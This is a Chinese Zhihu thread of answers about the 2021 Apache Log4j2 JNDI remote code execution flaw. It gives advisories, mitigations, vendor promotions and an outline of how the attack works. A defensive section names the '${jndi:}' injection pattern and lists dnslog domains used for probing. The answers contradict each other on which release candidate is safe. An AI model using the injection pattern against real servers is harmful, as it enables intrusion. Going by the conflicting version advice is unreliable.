+<p>据悉，此次 Apache Log4j2 远程代码执行漏洞风险已被业内评级为 “高危”，且漏洞危害巨大，利用门槛极低。有报道称，目前 Apache Solr、Apache Struts2、Apache Druid、Apache Flink 等众多组件及大型应用均已经受到了影响，需尽快采取方案阻止。</p>
+<h3 id=解决方案><strong>解决方案</strong></h3>
+<p>目前，Apache Log4j 已经发布了新版本来修复该漏洞，请受影响的用户将 Apache Log4j2 的所有相关应用程序升级至最新的 Log4j-2.15.0-rc2 版本，同时升级已知受影响的应用程序和组件，如 srping-boot-strater-log4j2、Apache Solr、Apache Flink、Apache Druid。</p>
+<p>临时修复建议：</p>
+<ul>
+<li>JVM 参数添加 -Dlog4j2.formatMsgNoLookups=true</li>
+<li>log4j2.formatMsgNoLookups=True</li>
+<li>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true</li>
+</ul>
+<h3 id=更新><strong>更新：</strong></h3>
+<p>据 Apache 官方最新信息显示，release 页面上已经更新了 Log4j 2.15.0 版本：</p>
+<p>由于正式发布工作正在进行中，因此对外暂时还无法看到 2.15 版本。</p>
+<p>据 Apache 方面人士透露，目前 Maven Central 上仍有 0 个工件，可能需要几个小时后才能同步镜像服务器并正式对外采用。更多后续，我们持续关注。<br>
+(摘自 SegmentFault)</p>
+<p><strong>结论：PHP 是世界上最好的语言！</strong></p>
+<h3 id=知乎用户-摩金-发表>知乎用户 摩金​​ 发表</h3>
+<p>听说各大厂程序员半夜被叫起来改，pdd 不改完不让下班。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-22f10d1b465842dee419bdb2d074aaae_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-ff88d8cf352997accecadddb6c0f25da_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-3731ce9f2af4829d2868cf2d18c1bf03_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h2 id=修复建议-3>修复建议</h2>
+<p>1、禁止使用 log4j 服务器外连，升级 idk 11.0.1 8u191 7u201 6u211 或更高版本。</p>
+<p>2、升级至 log4j-2.15.0-rc2：</p>
+<p>下载地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
+<p>3、紧急缓解措施：</p>
+<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups=true</p>
+<p>（2） 修改配置 log4j2.formatMsgNoLookups=True</p>
+<p>（3） 将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>
+<p><a href="https://link.zhihu.com/?target=http%3A//nosec.org/m/share/4917.html">【安全通报】Apache Log4j2 远程代码执行漏洞</a></p>
+<h3 id=知乎用户-夜雨声繁-发表>知乎用户 夜雨声繁 发表</h3>
+<p>目前最新进展， 2.15.0-rc1 版本存在绕过，Apache Log4j 2.x &lt; 2.15.0-rc2。</p>
+<p>哈哈哈，刚更新到 rc1 的是不是傻眼了</p>
+<p>-&mdash;&mdash;&ndash; 分割线 &mdash;&ndash;</p>
+<p>鉴于 rc2 提示也能被绕过，大家直接更新到 2.15.0 GA 版本吧~~~</p>
+<p>官网地址</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//logging.apache.org/log4j/2.x/download.html">Download Apache Log4j 2</a></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-0d45993860c307212f9e50d924701542_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>漏洞已经在 2.15.0 的正式版被修复。</p>
+<p>ps: 有大佬能告诉我是怎么绕的么 ·~~~</p>
+<h3 id=知乎用户--匿名用户-发表-1>知乎用户 匿名用户 发表</h3>
+<p>美企，刚下班看到这个知乎答案，过了半小时部门里面开了个 sev2 把每个组 oncall 都叫来紧急处理了。。。</p>
+<h3 id=知乎用户-赫尔海姆的诗人-发表>知乎用户 赫尔海姆的诗人​ 发表</h3>
+<p>造成什么影响我不想思考，我只知道游戏都开了结果突然被喊起来更新项目依赖的我真是个可怜的孩子</p>
+<h3 id=知乎用户-改名还要开会员-发表>知乎用户 改名还要开会员 发表</h3>
+<p>#几张图帮你了解漏洞的危害#</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-ca84eb434377eb5280c4e463703b0a5c_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-992fa89def2ea25450e1df95f2fcf287_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-bf32d2df4fa863f38b9c3812e479bc19_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-ad4f51e015af0ca5a3927f980de6b4aa_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=知乎用户-匿名用户-发表-1>知乎用户 匿名用户 发表</h3>
+<p>没有在除夕夜放出就可以了，但是一定是一个不眠之夜。</p>
+<h3 id=知乎用户-守护石-cto-发表>知乎用户 守护石 CTO​​ 发表</h3>
+<p>这漏洞可真大，阿里牛人的 log4j2 漏洞检测跑了一下，直接调起了计算器。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-18d952bacb344417d0b5db7d348d2b65_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>漏洞流程我是这样分析理解的：</p>
+<p>(1) 我们使用 log4j2 在 info、debug、warn、error 过程中会传入打印参数。</p>
+<p>(2) 若这些参数来自于外部，例如：web 提交，数据采集等，我们对外部请求的一些数据作为日志用 log4j2 打印或者输出成日志文件。</p>
+<p>(3) 在外部数据中若恶意加入一个 jndi 的 ldap U 地址变量进行，这个 URL 指向的是恶意 ldap 服务。</p>
+<p>(4) 当 log4j2 开始打印这段包含恶意 URL 变量，会识别出这段 URL，然后进行 jndi 的 ldap 调用进行对象 lookup。</p>
+<p>(5) 接受 log4j2 请求的恶意 ldap 服务会给 log4j2 传回一个恶意的 class。</p>
+<p>(6)log4j2 获取此 class 仅仅是对象根，然后会根据这个根的信息再次远程请求恶意 RPC 服务器，获取此 class 根对应的恶意实现对象，并在 jvm 上反序列化。</p>
+<p>(7) 此对象会在反序列化成功后，会在 log4j2 所在的 jvm 运行环境执行各种内置恶意执行调用。</p>
+<p>总之一句话，兄弟们赶紧打补丁吧，这漏洞把雨水都漏到裤衩里啦！</p>
+<hr>
+<p>全平台漏洞，以 Linux 云计算的应用部署量，问题更严重，Windows 只是本机测试，产品涉及有 log4j2，一定要升级 jog4j2 最新版的 jar 包，还要自查依赖包有没有把 log4j2 打进依赖 jar 内部。</p>
+<p><a href="https://link.zhihu.com/?target=http%3A//www.readbyte.com/">关注领域：大数据技术、分布式架构 ｜ 技术管理</a></p>
+<h3 id=知乎用户-轻流-发表>知乎用户 轻流​ 发表</h3>
+<p>12 月 9 日，Apache Log4j2 安全漏洞大规模暴露，网络中出现了利用此漏洞的攻击行为。这个漏洞几乎影响所有行业，包括全球多家知名科技公司、电商网站等，漏洞波及面和危害程度均堪比 2017 年的 “永恒之蓝” 漏洞。</p>
+<p>Apache ，是世界使用排名第一的 Web 服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，是最流行的 Web 服务器端软件之一。</p>
+<p>Apache Log4j2 是 Apache 的一个开源项目，用于 Java 的日志记录库，支持远程启动日志服务器。该工具重写了 Log4j 框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI 组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/80/v2-8bbfe5ca586decfb2cbc37e9ba60c657_720w.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>目前发现 Log4j-2 中存在 JNDI 注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。该漏洞影响范围极大，且利用方式十分简单，攻击者仅需向目标输入一段代码，不需要用户执行任何多余操作即可触发该漏洞，使攻击者可以远程控制用户受害者服务器，90% 以上基于 java 开发的应用平台都会受到影响。</p>
+<h3 id=影响范围-1>影响范围：</h3>
+<p>Apache Log4j 2.x &lt;= 2.15.0-rc1</p>
+<p>受影响的应用及组件（包括但不限于）如下：</p>
+<p>Apache Solr、Apache Flink、Apache Druid、Apache Struts2、<a href="https://www.zhihu.com/search?q=srping-boot-strater-log4j2&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2268692297%7D">srping-boot-strater-log4j2</a> 等。</p>
+<h3 id=对企业的影响>对企业的影响</h3>
+<p>对于企业来说，“由于 Apache Log4j 存在递归解析功能，未取得身份认证的用户，可以从远程发送数据请求输入数据日志，轻松触发漏洞，最终在目标上执行任意代码。”</p>
+<p>通俗版解释就是：通过这个漏洞，黑客可以随意运行企业服务器中的脚本，企业最宝贵的数据资料可以随意删改。</p>
+<p>此次 Apache Log4j2 漏洞的 CVSS 评分达到了满分 10 分，很多媒体平台将其称为 “核弹级漏洞”，可以说是比较贴切的了。</p>
+<h3 id=紧急应对>紧急应对：</h3>
+<p><a href="https://link.zhihu.com/?target=https%3A//qingflow.com%3Futm_source%3Dzhihu_20211213%26utm_medium%3Dproduct%26utm_campaign%3Dhack%26utm_content%3D20211213">轻流 · 无代码搭建平台</a>高度重视此次安全事件，即刻启动安全应急响应，统一协调开发、测试、安全、运维、售后资源，在 10 日中午就形成完备的应对方案，下午 13:00 开始逐步安排不同版本的更新维护。</p>
+<p>基于此次事件，轻流做出以下评估与应对：</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==" alt></p>
+<p>本次 Apache Log4j2 高危漏洞，轻流基于长期积累的安全能力与技术能力，在发现漏洞的第一时间快速组织应对小组，发布安全预警、采取防护措施、进行安全维护，致力于保障企业用户的系统稳定与信息安全。</p>
+<p>目前，轻流已支持访问控制、安全认证、数据安全、服务安全等安全防护，为企业数字化系统提供多层安全保障。同时，轻流已通过 SOC2、ISO27001 认证等多项安全资质，并被授予信息系统安全等级保护三级，信息安全管理达到国际权威标准。在专有轻流安全防护方面，我们也为私有部署客户提供更全面的产品安全、运维安全、防御体系和权限管理。</p>
+<p>对于本次事件，轻流会持续关注并积极应对，尽力降低本次全球性安全漏洞带来的影响。</p>
+<h3 id=知乎用户-云效-devops-平台-发表>知乎用户 云效 DevOps 平台 发表</h3>
+<p>2021 年 12 月 10 日，国家信息安全漏洞共享平台（CNVD）收录了 <a href=https://www.zhihu.com/question/504954921>Apache Log4j2</a><a href="https://www.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266336592%7D">远程代码执行漏洞</a>（CNVD-2021-95914），此漏洞是一个基于 Java 的日志记录工具，为 Log4j 的升级。作为目前最优秀的 Java 日志框架之一，被大量用于业务系统开发。<br>
+<strong>漏洞信息</strong></p>
+<p>早在 2021 年 11 月 24 日阿里巴巴云安全团队就报告了该漏洞，为了帮助大家更快的识别漏洞，避免受到潜在的攻击，阿里云云效技术团队提供了针对该漏洞的处理方案。</p>
+<p><strong>源码级扫描，将风险及时扼杀</strong><br>
+阿里云云效代码管理平台 Codeup 的「依赖包漏洞检测」支持在源码层面实时扫描依赖包风险，并提供漏洞修复方案，可针对企业代码库自动扫描漏洞并快速报出，避免人工肉眼排查可能造成的风险遗漏。<br>
+本次 Log4j 已被定义为 Blocker 级别高危漏洞，强烈建议尽快升级修复：</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==" alt></p>
+<p>如何使用检测</p>
+<p>代码库管理员进入仓库设置 - 集成与服务中开启「依赖包漏洞检测」，请注意 Java 代码需要勾选「设置 Java 检测参数」：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-04d3e0e0451514a6507bad19126ced0b_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>开启后默认分支将自动开始执行检测，等待检测完成，可查看分支代码检测详情，在检测报告中提供了漏洞说明与修复方案建议：</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==" alt></p>
+<p>由于漏洞库实时更新，历史已开启扫描的代码库需要主动开关或提交代码以触发执行一次最新扫描。<br>
+如何修复漏洞</p>
+<p>依据检测建议，修改 Apache Log4j 相关依赖版本至最新的 Log4j-2.15.0 。<br>
+<strong>自动修复漏洞</strong><br>
+手动依次更新依赖文件非常繁琐，云效代码管理平台 Codeup 还提供了智能化的漏洞自动修复能力，当检测出存在该安全漏洞时，在「安全」问题列表页面将提供黄色标识，支持一键自动修复漏洞：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-1650d77017255dab13cc793ba9cab95d_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>展开问题详情，点击「创建合并请求自动修复」按钮将自动生成一个合并请求，人工审核确认后可一键合并，自动修复漏洞：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-99de0a41212775538530c2dc27193fff_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-d0b64994b7bf5bd6f505c0e3efddccd2_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>查看文件差异可以看到该合并请求已自动将代码 <a href="https://www.zhihu.com/search?q=pom.xml&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266336592%7D">pom.xml</a> 中的 Log4j 依赖版本升级到建议的安全版本：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-f0c8a3b3c129640f73c686e2791823df_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>人工确认后点击合并，代码合并变更将自动重新触发代码检测服务，查看检测结果可确认漏洞已修复解决：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-19f58633361610ca740357934c70176c_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><strong>极致的云端代码托管保护</strong><br>
+本次 Apache Log4j2 开源依赖包漏洞为所有人敲响警钟，企业的代码作为最重要的数字资产之一，很可能正面临着各种安全风险。企业和开发者在解决这个单点问题的同时，还需要思考如何更全面的保障自己的代码数据安全。<br>
+阿里云云效代码管理平台 Codeup 提供了丰富的安全服务，在访问安全、数据可信、审计风控、存储安全等角度全方位保障企业代码资产安全，如果你开始重视安全这件事，不妨立即前往<a href="https://link.zhihu.com/?target=https%3A//www.aliyun.com/product/yunxiao/codeup%3Fspm%3D5176.168087.J_2805946210.2.913757a3ku5wBK">云效 Codeup</a> 开始探索。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-afa7d5f680b9950d30c9f2d569e6c677_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=知乎用户-无欢不散-发表>知乎用户 无欢不散​ 发表</h3>
+<p><strong>漏洞概述</strong></p>
+<p>Apache Log4j2 是一款开源的 Java 日志框架，被广泛地应用在<a href="https://www.zhihu.com/search?q=%E4%B8%AD%E9%97%B4%E4%BB%B6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266027256%7D">中间件</a>、开发框架与 Web 应用中，用来记录日志信息。</p>
+<p>由于 Apache Log4j2 某些功能存在递归解析功能，未经身份验证的攻击者通过发送特别构造的数据请求包，可在目标服务器上执行任意代码。漏洞 PoC 已在网上公开，默认配置即可进行利用，该漏洞影响范围极广，建议相关用户尽快采取措施进行排查与防护。</p>
+<h2 id=影响范围-2><strong>影响范围</strong></h2>
+<p><strong>受影响版本：</strong></p>
+<p>Apache Log4j 2.x &lt;= 2.14.1</p>
+<p><strong>供应链影响范围：</strong></p>
+<p><strong>已知受影响应用及组件：</strong></p>
+<p>Apache Solr</p>
+<p>Apache Flink</p>
+<p>Apache Druid</p>
+<p><a href="https://www.zhihu.com/search?q=srping-boot-strater-log4j2&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266027256%7D">srping-boot-strater-log4j2</a></p>
+<p>更多组件可参考如下链接：</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages%3Fp%3D1">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1</a></p>
+<p><strong>不受影响版本：</strong></p>
+<p>Apache log4j-2.15.0-rc1</p>
+<h2 id=漏洞检测人工检测><strong>漏洞检测人工检测</strong></h2>
+<p>1、相关用户可根据 Java jar 解压后是否存在 org/apache/logging/log4j 相关路径结构，判断是否使用了存在漏洞的组件，若存在相关 Java 程序包，则很可能存在该漏洞。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-8d28b2aad6aa28c462826b9fe03fa4dc_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>2、若程序使用 Maven 打包，查看项目的 <a href="https://www.zhihu.com/search?q=pom.xml&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266027256%7D">pom.xml</a> 文件中是否存在下图所示的相关字段，若版本号为小于 2.15.0，则存在该漏洞。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-1e3488edecefe481d3082d6f2481ff04_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>3、若程序使用 gradle 打包，可查看 build.gradle 编译配置文件，若在 dependencies 部分存在 org.apache.logging.log4j 相关字段，且版本号为小于 2.15.0，则存在该漏洞。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-623fb4fc2f346b08cdbc33ab3f5730ec_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=攻击排查><strong>攻击排查</strong></h3>
+<p>1、攻击者在利用前通常采用 dnslog 方式进行扫描、探测，常见的漏洞利用方式可通过应用系统报错日志中的 &ldquo;javax.naming.CommunicationException&rdquo;、&ldquo;javax.naming.NamingException: problem generating object using object factory&rdquo;、&ldquo;Error looking up JNDI resource&rdquo; 关键字进行排查。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-c3cd7df14a71b073ae1a279755785955_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>2、攻击者发送的数据包中可能存在 &ldquo;${jndi:}&rdquo; 字样，推荐使用全流量或 WAF 设备进行检索排查。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-3985e9fea316267b9575dc89dc2ad13f_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=产品检测><strong>产品检测</strong></h3>
+<p>请有部署以上设备的用户升级至最新版本。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>升级包版本号</th>
+<th>升级包下载链接</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RSAS V6 系统插件包</td>
+<td>V6.0R02F01.2508</td>
+<td><a href="https://link.zhihu.com/?target=http%3A//update.nsfocus.com/update/downloads/id/121946">http://update.nsfocus.com/update/downloads/id/121946</a></td>
+</tr>
+<tr>
+<td>RSAS V6 Web 插件包</td>
+<td>V6.0R02F00.2406</td>
+<td><a href="https://link.zhihu.com/?target=https%3A//update.nsfocus.com/update/listRsasDetail/v/vulweb">https://update.nsfocus.com/update/listRsasDetail/v/vulweb</a></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td><a href="https://link.zhihu.com/?target=https%3A//update.nsfocus.com/update/listWvssDetail/v/6/t/plg">https://update.nsfocus.com/update/listWvssDetail/v/6/t/plg</a></td>
+</tr>
+<tr>
+<td>IDS</td>
+<td>5.6.10.26697</td>
+<td><a href="https://link.zhihu.com/?target=http%3A//update.nsfocus.com/update/downloads/id/121949">http://update.nsfocus.com/update/downloads/id/121949</a></td>
+</tr>
+<tr>
+<td>IDS</td>
+<td>5.6.11.26697</td>
+<td><a href="https://link.zhihu.com/?target=http%3A//update.nsfocus.com/update/downloads/id/121950">http://update.nsfocus.com/update/downloads/id/121950</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id=漏洞防护><strong>漏洞防护</strong></h2>
+<h3 id=官方升级><strong>官方升级</strong></h3>
+<p>目前官方已发布测试版本修复该漏洞，受影响用户可先将 Apache Log4j2 所有相关应用到该版本，下载链接：<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
+<p>注：由于此版本非正式发行版，可能出现不稳定的情况，建议用户在备份数据后再进行升级。</p>
+<p>升级供应链中已知受影响的应用及组件：Apache Solr、Apache Flink、Apache Druid、srping-boot-strater-log4j2</p>
+<h3 id=临时防护措施><strong>临时防护措施</strong></h3>
+<p>若相关用户暂时无法进行升级操作，可先用下列措施进行临时缓解：</p>
+<p>1、添加 jvm 启动参数:-Dlog4j2.formatMsgNoLookups=true</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-b2c980635a2ad0000bd9e53762bc3829_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>2、在应用 classpath 下添加 <a href="https://link.zhihu.com/?target=http%3A//log4j2.component.properties/">log4j2.component.properties</a> 配置文件，文件内容为：log4j2.formatMsgNoLookups=true</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-1e71f9320e4db6ab36aff0294cf86d01_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>3、建议 JDK 使用 11.0.1、8u191、7u201、6u211 及以上的高版本</p>
+<p>4、限制受影响应用对外访问互联网，并在边界对 dnslog 相关<a href="https://www.zhihu.com/search?q=%E5%9F%9F%E5%90%8D&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266027256%7D">域名</a>访问进行检测。</p>
+<p>部分公共 dnslog 平台如下：</p>
+<p><a href="https://link.zhihu.com/?target=http%3A//ceye.io/">ceye.io</a></p>
+<p><a href="https://link.zhihu.com/?target=http%3A//dnslog.link/">dnslog.link</a></p>
+<p><a href="https://link.zhihu.com/?target=http%3A//dnslog.cn/">dnslog.cn</a></p>
+<p><a href="https://link.zhihu.com/?target=http%3A//dnslog.io/">dnslog.io</a></p>
+<p><a href="https://link.zhihu.com/?target=http%3A//tu4.org/">tu4.org</a></p>
+<p><a href="https://link.zhihu.com/?target=http%3A//awvsscan119.autoverify.cn/">awvsscan119.autoverify.cn</a></p>
+<p><a href="https://link.zhihu.com/?target=http%3A//burpcollaborator.net/">burpcollaborator.net</a></p>
+<p><a href="https://link.zhihu.com/?target=http%3A//s0x.cn/">s0x.cn</a></p>
+<h2 id=程序员书单>程序员书单</h2>
+<p><strong>这里有一份精心整理的程序员书单，你一定不想错过：</strong></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-f09feb0299b4ba3fac5b6ed04e969f47_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>可以通过下面方式获取：</p>
+<p><a href="https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzkxNDI3NjcwMw%3D%3D%26mid%3D100012148%26idx%3D1%26sn%3Df35ddd0a70655aebce606f532f1a79f9%26chksm%3D417258447605d15270e518a03cbb46bf57249e79fb1688e99433dd3e66502dad2f7b82a8f164%23rd">程序员必看经典书单</a></p>
+<h3 id=知乎用户-冯天鹤-发表>知乎用户 冯天鹤 发表</h3>
+<p>log4j 1 也有影响</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/pull/608">https://github.com/apache/logging-log4j2/pull/608</a></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-fb9a9ddf3b910a03f3e75c5f3aa070c9_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=知乎用户-mentoki-发表>知乎用户 mentoki 发表</h3>
